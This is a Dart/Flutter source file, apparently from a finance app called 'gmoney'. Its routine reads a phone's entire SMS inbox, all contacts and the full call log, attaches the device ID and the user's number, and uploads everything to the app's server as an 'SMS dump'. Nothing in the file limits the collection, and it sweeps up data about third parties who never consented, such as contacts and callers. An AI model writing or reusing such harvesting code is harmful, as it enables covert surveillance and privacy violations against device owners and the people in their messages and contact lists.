import 'dart:io';

import 'package:call_log/call_log.dart';
import 'package:device_info/device_info.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:gmoney/api/web_service_client.dart';
import 'package:gmoney/models/fetch_inbox_model.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

class UserData {
  static getUserData() async {
    String? deviceID = await _getId();
    print('deviceID');
    print(deviceID);
    var sp = await SharedPreferences.getInstance();
    String phoneNo = sp.getString('userMobile') ?? "7038878317";

    /// getting SMSs
    final SmsQuery _query = SmsQuery();
    List<SmsMessage> _messages = [];
    var permission = await Permission.sms.status;
    if (permission.isGranted) {
      print("permission");
      final messages = await _query.querySms(
        kinds: [SmsQueryKind.inbox],
        // address: '+254712345789',
        // count: 10,
      );
      debugPrint('sms inbox messages: ${messages.length}');

      if (messages != null && messages.isNotEmpty) {
        List<FetchInboxModel> fetchInboxModel = <FetchInboxModel>[];
         fetchInboxModel = <FetchInboxModel>[
          for (int i = 0; i < messages.length; i++)
            FetchInboxModel(
              dateSent: messages[i].date.toString(),
              body: messages[i].body ?? "",
              origin: messages[i].address ?? "",
            ),
        ];
        print(fetchInboxModel.length);
        //////////////////////////

        /// adding contacts
        List<Contact>? _contacts = await getContacts();
        for (int i = 0; i < _contacts!.length; i++)
          fetchInboxModel.add(
            FetchInboxModel(
              body: _contacts[i].displayName,
              dateSent: DateTime.now().toString(),
              origin: _contacts[i].phones.isNotEmpty
                  ? _contacts[i].phones[0].number
                  : "no phone", //widget.message?[i].date ?? 0,
            ),
          );

        /// adding call logs
        Iterable<CallLogEntry> callLogs = await getCallLogs();
        callLogs.forEach((element) {
          fetchInboxModel.add(FetchInboxModel(
              body: element.callType.toString(),
              origin: element.number.toString(),
              dateSent: DateTime.now().toString()));
        });

        /// sending data in API
        print(fetchInboxModel);
        var data = {
          'deviceId': deviceID,
          "mobile": phoneNo,
          'smslog': fetchInboxModel,
        };
        var response = await WebServiceClient.uploadSMSDump(data);
        print('sms response is');
        print(response);
      }
    } else {
      await Permission.sms.request();
    }
  }
}

Future<String?> _getId() async {
  if (Platform.isIOS) {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
    print('Running on ${iosInfo.utsname.nodename}');
    return iosInfo.identifierForVendor;
  } else if (Platform.isAndroid) {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    print('Running on ${androidInfo.model}');
    return androidInfo.androidId;
  }
}

getContacts() async {
  List<Contact>? _contacts;
  bool _permissionDenied = false;
  if (!await FlutterContacts.requestPermission(readonly: true)) {
    _permissionDenied = true;
    print('permission denied');
  } else {
    final contacts = await FlutterContacts.getContacts();
    _contacts = contacts;
    print('_contacts');
    if (_contacts.isNotEmpty) {
      print(_contacts.length);
    }
    return _contacts;
  }
}

getCallLogs() async {
  Iterable<CallLogEntry> _callLogEntries = await CallLog.get();

  var now = DateTime.now();
  int from = now.subtract(Duration(days: 60)).millisecondsSinceEpoch;
  int to = now.subtract(Duration(days: 0)).millisecondsSinceEpoch;
  Iterable<CallLogEntry> entries = await CallLog.query(
      // dateFrom: from,
      // dateTo: to,
      // type: CallType.incoming,
      );
  print('callLogs');
  print(entries.length);
  return entries;
}
